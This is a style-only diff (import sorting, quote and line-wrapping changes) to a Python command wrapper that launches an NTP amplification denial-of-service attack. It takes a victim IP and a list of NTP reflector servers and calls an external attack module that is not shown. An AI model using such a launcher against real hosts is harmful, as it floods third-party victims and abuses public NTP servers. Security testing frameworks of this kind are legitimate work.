@@ -1,13 +1,14 @@
 """Perform NTP amplification attack"""
 
 import argparse
-import sys
-import os
 import logging
+import os
+import sys
 
 from .base import AttackBase
 
 logger = logging.getLogger(__name__)
+
 
 class NtpAmplification(AttackBase):
     """Perform NTP amplification attack"""
@@ -16,10 +17,14 @@ class NtpAmplification(AttackBase):
     description = "Perform NTP amplification attack"
 
     def add_arguments(self, parser: argparse.ArgumentParser) -> None:
-        parser.add_argument('--victim', required=True, help='Victim IP address')
-        parser.add_argument('--ntp-servers', required=True, help='NTP server IPs (comma-separated)')
-        parser.add_argument('--count', type=int, default=100, help='Number of packets (default: 100)')
-        parser.add_argument('--verbose', action='store_true', help='Verbose output')
+        parser.add_argument("--victim", required=True, help="Victim IP address")
+        parser.add_argument(
+            "--ntp-servers", required=True, help="NTP server IPs (comma-separated)"
+        )
+        parser.add_argument(
+            "--count", type=int, default=100, help="Number of packets (default: 100)"
+        )
+        parser.add_argument("--verbose", action="store_true", help="Verbose output")
 
     def validate(self, args: argparse.Namespace) -> bool:
         # Validate victim IP
@@ -28,7 +33,7 @@ class NtpAmplification(AttackBase):
             return False
 
         # Validate NTP servers (comma-separated list)
-        ntp_servers = [s.strip() for s in args.ntp_servers.split(',')]
+        ntp_servers = [s.strip() for s in args.ntp_servers.split(",")]
         if not ntp_servers or len(ntp_servers) == 0:
             logger.error("No NTP servers provided")
             return False
@@ -48,22 +53,22 @@ class NtpAmplification(AttackBase):
         return True
 
     def run(self, args: argparse.Namespace) -> None:
-        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
-        path = os.path.join(scripts_dir, 'ntp_amplification')
+        scripts_dir = os.path.join(
+            os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "scripts"
+        )
+        path = os.path.join(scripts_dir, "ntp_amplification")
         sys.path.insert(0, path)
         try:
             import ntp_amplification as attack_module
-            logger.info(f"Running ntp-amplification attack")
+
+            logger.info("Running ntp-amplification attack")
 
             # Parse NTP servers list
-            ntp_servers = [s.strip() for s in args.ntp_servers.split(',')]
+            ntp_servers = [s.strip() for s in args.ntp_servers.split(",")]
 
             # Create and execute attack
             attack = attack_module.NTPAmplificationAttack(
-                args.victim,
-                ntp_servers,
-                args.count,
-                args.verbose
+                args.victim, ntp_servers, args.count, args.verbose
             )
             attack.execute()
         except Exception as e:
